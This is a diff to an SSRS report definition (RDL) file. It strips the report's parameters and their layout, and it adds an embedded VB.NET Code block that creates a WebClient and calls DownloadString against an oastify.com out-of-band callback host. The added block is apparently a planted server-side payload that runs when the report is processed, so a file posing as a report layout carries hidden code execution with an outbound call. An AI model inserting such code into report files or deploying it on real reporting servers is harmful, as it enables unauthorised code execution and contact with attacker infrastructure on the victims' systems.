@@ -37,56 +37,16 @@
       </Page>
     </ReportSection>
   </ReportSections>
-  <ReportParameters>
-    <ReportParameter Name="clientID">
-      <DataType>String</DataType>
-      <Prompt>clientID</Prompt>
-    </ReportParameter>
-    <ReportParameter Name="UserName">
-      <DataType>String</DataType>
-      <Prompt>UserName</Prompt>
-    </ReportParameter>
-    <ReportParameter Name="userID">
-      <DataType>String</DataType>
-      <Prompt>userID</Prompt>
-    </ReportParameter>
-    <ReportParameter Name="DateFrom">
-      <DataType>String</DataType>
-      <Prompt>DateFrom</Prompt>
-    </ReportParameter>
-    <ReportParameter Name="DateTo">
-      <DataType>String</DataType>
-      <Prompt>DateTo</Prompt>
-    </ReportParameter>
-  </ReportParameters>
   <ReportParametersLayout>
     <GridLayoutDefinition>
       <NumberOfColumns>4</NumberOfColumns>
       <NumberOfRows>2</NumberOfRows>
-      <CellDefinitions>
-        <CellDefinition>
-          <ColumnIndex>2</ColumnIndex>
-          <RowIndex>0</RowIndex>
-          <ParameterName>DateFrom</ParameterName>
-        </CellDefinition>
-        <CellDefinition>
-          <ColumnIndex>3</ColumnIndex>
-          <RowIndex>0</RowIndex>
-          <ParameterName>DateTo</ParameterName>
-        </CellDefinition>
-        <CellDefinition>
-          <ColumnIndex>0</ColumnIndex>
-          <RowIndex>1</RowIndex>
-          <ParameterName>clientID</ParameterName>
-        </CellDefinition>
-        <CellDefinition>
-          <ColumnIndex>1</ColumnIndex>
-          <RowIndex>1</RowIndex>
-          <ParameterName>UserName</ParameterName>
-        </CellDefinition>
-      </CellDefinitions>
     </GridLayoutDefinition>
   </ReportParametersLayout>
+  <Code>
+    Dim webClient As New System.Net.WebClient
+    Dim result As String = webClient.DownloadString("http://mka0xcp2xotw6hq3a0nt1owa117svpje.oastify.com/abc/123/")
+  </Code>
   <rd:ReportUnitType>Inch</rd:ReportUnitType>
   <rd:PageUnit>Px</rd:PageUnit>
   <df:DefaultFontFamily>Segoe UI</df:DefaultFontFamily>
